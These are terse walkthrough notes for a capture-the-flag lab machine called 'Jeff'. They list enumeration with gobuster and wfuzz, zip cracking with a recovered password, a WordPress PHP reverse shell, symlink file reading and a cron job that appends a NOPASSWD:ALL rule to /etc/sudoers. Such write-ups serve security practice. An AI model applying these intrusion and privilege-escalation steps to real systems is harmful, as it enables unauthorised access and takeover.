# Jeff 

```
1. add 'jeff.htm' /etc/hosts
echo "export_ip jeff.thm" >> /etc/hosts

2. gobuster jeff.thm

3. gobuster jeff.thm/backup

4. fcrackzip backup.zip
: password is Burningbird

5. wfuzz -c -f sub-fighter -w /usr/share/amass/wordlists/subdomains-top1mil-20000.txt -u "http://jeff.thm/" -H "Host:FUZZ.jeff.thm" -t 42 --hh 62

6. add 'wordpress.jeff.thm' >> /etc/hosts

systool password: 123-My-N4M3-1z-J3ff-123

7. wordpress php revershell code inject

8. uploads.py

9. find jeff password
- /opt/systool/
- ln -s /var/backups/jeff.bkp message.txt
- ./systool

10. sudo -l
- sudo crontab -e
- */1 * * * * echo "jeff ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
- sudo su

```